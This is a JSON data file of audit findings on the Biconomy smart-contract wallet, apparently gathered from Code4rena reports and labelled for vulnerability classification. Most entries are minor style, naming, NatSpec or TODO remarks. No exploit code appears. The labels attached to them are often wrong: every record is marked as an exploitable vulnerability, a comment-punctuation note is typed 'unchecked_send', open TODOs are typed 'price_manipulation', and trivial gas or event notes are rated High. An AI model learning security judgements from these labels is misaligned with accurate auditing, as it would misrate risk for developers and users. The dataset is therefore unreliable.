    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n355: /// @dev Allows to estimate a transaction.\n358: /// @param to Destination address of Safe transaction.\n359: /// @param value Ether value of transaction.\n360: /// @param data Data payload of transaction.\n361: /// @param operation Operation type of transaction.\n362: /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs).\n377: /// @dev Returns hash to be signed by owner.\n378: /// @param to Destination address.\n379: /// @param value Ether value.\n380: /// @param data Data payload.\n381: /// @param operation Operation type.\n382: /// @param targetTxGas Fas that should be used for the safe transaction\n383: /// @param baseGas Gas costs for data used to trigger the safe transaction.\n384: /// @param gasPrice Maximum gas price that should be used for this transaction.\n385: /// @param gasToken Token address (or 0 if ETH) that is used for the payment.\n386: /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).\n387: /// @param _nonce Transaction nonce.\n388: /// @return Transaction hash.\n419: /// @dev Returns the bytes that are hashed to be signed by owner.\n422:\u00a0/// @param _nonce Transaction nonce.\n423: /// @return Transaction hash bytes.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "09 Don't use periods with fragments",
    "description": "Throughout the files, most of the comments have fragments that end with periods. They should either be converted to actual sentences with both a noun phrase and a verb phrase, or the periods should be removed. _There are 45 instances of this issue_ https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol File: contracts/smart-contract-wallet/SmartAccount.sol 355: /// @dev Allows to estimate a transaction.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n8: import {IAccount.sol} from \"@account-abstraction/contracts/interfaces/IAccount.sol\";\n9: import {IEntryPoint.sol} \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\";\n10: import {Enum.sol} \"./common/Enum.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "10 Use named imports instead of plain 'import file.sol'",
    "description": "For instance, you use regular imports such as: [BaseSmartAccount.sol#L8-L10](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L8-L10) 8: import \"@account-abstraction/contracts/interfaces/IAccount.sol\"; 9: import \"@account-abstraction/contracts/interfaces/IEntryPoint.sol\"; 10: import \"./common/Enum.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.221,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n    function setSigner( address _newVerifyingSigner) external onlyOwner{\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "MISSING EVENTS ON CRITICAL OPERATIONS",
    "description": "Critical operations not triggering events will make it difficult to review the correct behavior of the contracts. Users and blockchain monitoring systems will not be able to easily detect suspicious behaviors without events. Here is 1 instance found. [VerifyingSingletonPaymaster.sol#L65](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L65) function setSigner( address _newVerifyingSigner) external onlyOwner{",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.074,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n[EntryPoint.sol#L255](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L255)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Medium",
    "title": "TODO",
    "description": "Open TODO can point to an architecture or programming issue needing to be resolved. It is recommended resolving them before deploying. Here are the 2 instances found. [SmartAccountNoAuth.sol#L44](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol#L44) (Note: Out of scope but included here for informational purpose) // todo? rename wallet to account [EntryPoint.sol#L255](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L255)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.161,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n[StakeManager.sol#L86](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L86)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "SETTING TO DEFAULT VALUES",
    "description": "As documented in the link: https://docs.soliditylang.org/en/v0.8.17/types.html?highlight=delete#delete It is recommended using `delete` whenever there is a need to set state variable to its default value, which has a good side effect of saving gas. Here are the 5 instances found. [ModuleManager.sol#L52](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L52)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.163,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n261:            (bool success,) = receiver.call{value: payment}(\"\");\n\n285:            (bool success,) = receiver.call{value: payment}(\"\");\n\n451:        (bool success,) = dest.call{value:amount}(\"\");\n\n478:        (bool success, bytes memory result) = target.call{value : value}(data);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "CONTRACT EXISTENCE CHECK",
    "description": "Low-level calls do not check for contract existence. They are known to return success even though no function call has been executed when involving contract that may not have been deployed or have been self-destructed. Here are 4 of the instances found. [SmartAccount.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol) 261:            (bool success,) = receiver.call{value: payment}(\"\"); 285:            (bool success,) = receiver.call{value: payment}(\"\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.285,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n127:    function updateEntryPoint(address _newEntryPoint) external mixedAuth { // Missing full spec\n\n135:    function domainSeparator() public view returns (bytes32) { // Missing full spec\n\n192:    function execTransaction( // Missing @return\n\n247:    function handlePayment( // Missing full spec\n\n271:    function handlePaymentRevert( // Missing full spec\n\n302:    function checkSignatures( // Missing @param data\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "MISSING NATSPEC",
    "description": "As documented in the link below: https://docs.soliditylang.org/en/v0.8.16/natspec-format.html It is recommended using a special form of comments, i.e., the Ethereum Natural Language Specification Format (NatSpec) to provide rich documentation for functions, return variables and more. Here are some of the instances found. [SmartAccount.sol](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.416,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "\ud83d\udd0d Findings:",
    "description": "| | | |---|---| |2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L46|[//     \"AccountTx(address to,uint256 value,bytes data,uint8 operation,uint256 targetTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)\"](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L46 )| |2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239|[payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239 )| |2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L357|[///      Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L357 )|",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.086,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_setImplementation(_implementation)",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "4. MISSING `address(0)` CHECKS FOR THE FOLLOWING ADDRESS INPUTS TO THE FUNCTIONS.",
    "description": "function updateImplementation(address _implementation) external mixedAuth { require(_implementation.isContract(), \"INVALID_IMPLEMENTATION\"); //@audit - does this check for zero address _setImplementation(_implementation); By mistake _implementation could be set to address(0). Hence it is a good practice to check for address(0). require(_implementation != address(0), \"Address cannot be zero\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.035,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "require(_handler != address(0), \"Invalid Entrypoint\");",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "5. CONDUCTING REDUNDANT CHECKS FOR THE SAME CONDITION ON `_handler` PARAMETER.",
    "description": "require(_handler != address(0), \"Invalid Entrypoint\"); owner = _owner; _entryPoint =  IEntryPoint(payable(_entryPointAddress)); if (_handler != address(0)) internalSetFallbackHandler(_handler); In the above code the `require(_handler != address(0), \"Invalid Entrypoint\");` checks for the zero address condition. Hence there is no need to check the same condition using the if conditional check `if (_handler != address(0))`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.054,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_requireFromEntryPointOrOwner()",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "8. THE FUNCTION `_requireFromEntryPointOrOwner()` CAN BE CONVERTED TO A MODIFIER FOR BETTER CODE READABILITY.",
    "description": "The `_requireFromEntryPointOrOwner()` function does access control checks using the `require()` statement. Hence this function can be changed into a modifier and added to functions for better code readability. function execute(address dest, uint value, bytes calldata func) external onlyOwner{ _requireFromEntryPointOrOwner(); function _requireFromEntryPointOrOwner() internal view { require(msg.sender == address(entryPoint()) || msg.sender == owner, \"account: not Owner or EntryPoint\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "type(IERC165).interfaceId",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "9. CAN CHANGE THE VARIABLE NAME `interfaceId` to `_interfaceId`.",
    "description": "function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) { return interfaceId == type(IERC165).interfaceId; // 0x01ffc9a7 } In the above code `interfaceId` can be changed to `_interfaceId`, since `type(IERC165).interfaceId` is also called. Changed code will look as follows: function supportsInterface(bytes4 _interfaceId) external view virtual override returns (bool) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.025,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "only import what you need",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Description",
    "description": "Our Solidity code is also cleaner in another way that might not be noticeable: the struct Point. We were importing it previously with global import but not using it. The Point struct\u00a0`polluted the source code`\u00a0with an unnecessary object we were not using because we did not need it. This was breaking the rule of modularity and modular programming:\u00a0`only import what you need`\u00a0Specific imports with curly braces allow us to apply this rule better.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.025,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n18-28 contract SmartAccount is \n     Singleton,\n     BaseSmartAccount,\n     IERC165,\n     ModuleManager,\n     SignatureDecoder,\n     SecuredTokenTransfer,\n     ISignatureValidatorConstants,\n     FallbackManager,\n     Initializable,\n     ReentrancyGuardUpgradeable\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "06 UPGRADEABLE CONTRACT IS MISSING A\u00a0`__GAP[50]`\u00a0STORAGE VARIABLE TO ALLOW FOR NEW STORAGE VARIABLES IN LATER VERSIONS",
    "description": "*Number of Instances Identified: 1* See\u00a0[this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps)\u00a0link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. 18-28 contract SmartAccount is Singleton, BaseSmartAccount,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.265,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n255: // TODO: copy logic of gasPrice?\n",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Medium",
    "title": "10 OPEN TODOS",
    "description": "*Number of Instances Identified: 1* Code architecture, incentives, and error handling/reporting questions/issues should be resolved before deployment https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 255: // TODO: copy logic of gasPrice?",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.039,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L468](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L468)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings",
    "description": "Total:22 [scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L222](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L222) 222:    result += 16; [scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L271](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L271) 271:    result += 16;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.222,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings",
    "description": "Total:3 [scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L68) 68:    require(msg.sender != SENTINEL_MODULES && modules[msg.sender] != address(0), \"BSA104\"); [scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L34) 34:    require(module != address(0) && module != SENTINEL_MODULES, \"BSA101\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.21,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L126](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L126)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings",
    "description": "Total:33 [scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L336](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L336) 336:    bytes memory contractSignature; [scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L478](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L478) 478:    (bool success, bytes memory result) = target.call{value : value}(data);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.292,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L65](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L65)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Findings",
    "description": "Total:10 [scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L455) 455:    function pullTokens(address token, address dest, uint256 amount) external onlyOwner { [scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L536](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L536) 536:    function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.29,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n349:    function _validatePaymasterPrepayment(uint256 opIndex, UserOperation calldata op, UserOpInfo memory opInfo, uint256 requiredPreFund, uint256 gasUsedByValidateAccountPrepayment) internal returns (bytes memory context, uint256 deadline) {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings",
    "description": "Total:9 [scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L73](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L73) 73:    function _requireFromEntryPoint() internal virtual view { [scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L106](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L106) 106:    function _payPrefund(uint256 missingAccountFunds) internal virtual {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.254,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n\n[scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L47](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L47)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings",
    "description": "Total:17 [scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L146](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L146) 146:    uint256 result = mulDiv(x, y, denominator); [scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L173](https://github.com/code-423n4/2023-01-biconomy/tree/main//scw-contracts/contracts/smart-contract-wallet/libs/Math.sol#L173) 173:    uint256 result = 1 << (log2(a) >> 1);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.238,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nfunction withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external {\n        DepositInfo storage info = deposits[msg.sender];\n        require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");\n        info.deposit = uint112(info.deposit - withdrawAmount);\n        emit Withdrawn(msg.sender, withdrawAddress, withdrawAmount);\n        (bool success,) = withdrawAddress.call{value : withdrawAmount}(\"\");\n        require(success, \"failed to withdraw\");\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "## Funds can stuck",
    "description": "Contract: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L35 Issue: Funds can stuck if withdraw address is contract itself POC:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.486,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nfunction addStake(uint32 _unstakeDelaySec) public payable {\n...\n        require(stake <= type(uint112).max, \"stake overflow\");\n...\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Stake condition can be revised to allow type(uint112).max",
    "description": "Contract: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L65 Issue: It seems that currently Staking amount is capped to `type(uint112).max` even though deposit cap is set to `type(uint112).max`. This means the Staking cap could be revised to also allow `type(uint112).max` Recommendation:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.134,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nrequire(success || _tx.targetTxGas != 0 || refundInfo.gasPrice != 0, \"BSA013\");\n            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls\n            uint256 payment = 0;\n            // uint256 extraGas;\n            if (refundInfo.gasPrice > 0) {\n                //console.log(\"sent %s\", startGas - gasleft());\n                // extraGas = gasleft();\n                payment = handlePayment(startGas - gasleft(), refundInfo.baseGas, refundInfo.gasPrice, refundInfo.tokenGasPriceFactor, refundInfo.gasToken, refundInfo.refundReceiver);\n                emit WalletHandlePayment(txHash, payment);\n            }\n            // extraGas = extraGas - gasleft();\n            //console.log(\"extra gas %s \", extraGas);\n        }\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "No way to determine execution status",
    "description": "Contract: https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L232 Issue: If transaction execution via `execTransaction` does not success but has refundInfo.gasPrice != 0 then there is no way to know if the transaction never suceeded POC:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.805,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity=7\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Q-01 Use ReentrancyGuard instead of ReentrancyGuardUpgradeable",
    "description": "`ReentrancyGuardUpgradeable.sol` is recommend for the upgradble contract but `SmartAccount.sol` is the non-upgradable contract so use only `ReentrancyGuard.sol`. **FileName:** *scw-contract/contracts/smart-wallet-contract/SmartAccount.sol* import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\"; https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L7",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.097,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
